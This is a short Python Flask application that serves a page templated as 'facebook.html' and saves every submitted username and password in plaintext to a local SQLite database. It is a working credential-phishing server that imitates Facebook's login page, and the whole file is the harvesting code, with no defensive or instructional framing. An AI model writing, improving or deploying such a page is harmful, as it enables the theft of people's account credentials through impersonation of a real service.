from flask import Flask, render_template, request
from flask_sqlalchemy import SQLAlchemy
from sqlalchemy import Column, String, Integer

app = Flask(__name__, template_folder="templates")
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///cred.db'

db = SQLAlchemy(app)

class Credential(db.Model):
    id = Column(Integer, primary_key=True)
    username = Column(String(100), nullable=False)
    password = Column(String(255), unique=True, nullable=False)

@app.route('/', methods=['POST', 'GET'])
def facebook_page():
    if request.method == 'POST':
        username = request.form.get("username")
        password = request.form.get("password")

        cred = Credential(username=username, password=password)
        db.session.add(cred)
        db.session.commit()
    else:
        pass
    return render_template("facebook.html")

if __name__ == "__main__":
    with app.app_context():
        db.create_all()
    app.run(debug=True)